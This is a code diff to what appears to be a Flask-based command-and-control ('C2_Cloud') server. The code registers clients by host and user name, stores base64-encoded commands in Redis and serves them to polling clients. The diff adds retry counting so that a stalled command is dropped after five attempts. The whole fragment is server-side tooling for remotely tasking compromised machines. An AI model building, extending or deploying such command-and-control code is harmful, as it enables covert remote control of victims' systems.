@@ -4,7 +4,8 @@
 
 import json
 import base64
-from flask import request, redirect, Response, make_response, jsonify, session, render_template
+import re
+from flask import request, send_file
 from libs.dbOperations import DBOperations
 from libs.redisOperations import RedisOperations
 from libs.common import Common
@@ -14,6 +15,7 @@ redis_client = RedisOperations()
 db_client = DBOperations()
 common = Common()
 logger_instance = init_logger('C2_Cloud')
+command_info = {}
 
 def init_client(session_id, host_name, user_name):
     # initialize the client 
@@ -46,6 +48,23 @@ def command_control(session_id, req_method):
         logger_instance.info(f"command_control - session_key: {session_key}, session_data: {session_data}, session_data_type: {type(session_data)}")
         commands = session_data["commands"]
         if commands:
+            # handle timedout events 
+            if session_key + "_" + commands[0]['command'] in command_info:
+                command_info[session_key + "_" + commands[0]['command']] = command_info[session_key + "_" + commands[0]['command']] + 1
+                if command_info[session_key + "_" + commands[0]['command']] > 5:
+                    # to handle new commands received during processing of the first command 
+                    update_redis_session_data = redis_client.get_data(session_key)
+                    new_commands = update_redis_session_data["commands"]
+                    logger_instance.info(f"command_control - method: GET, new_commands: {new_commands}")
+                    if new_commands:
+                        first_command = new_commands[0]["command"]
+                        new_commands.pop(0)
+                        update_redis_session_data["commands"] = new_commands
+                        logger_instance.info(f"command_control - method: GET, new_commands: {new_commands}, session_key: {session_key}, update_redis_session_data: {update_redis_session_data}")
+                        redis_client.write_session_data(session_key, update_redis_session_data)
+                        return ""
+            else:
+                command_info[session_key + "_" + commands[0]['command']] = 1
             try:
                 command = base64.b64decode(commands[0]['command']).decode("utf-8")
                 logger_instance.info(f'command_control - method: GET, command: {command}')
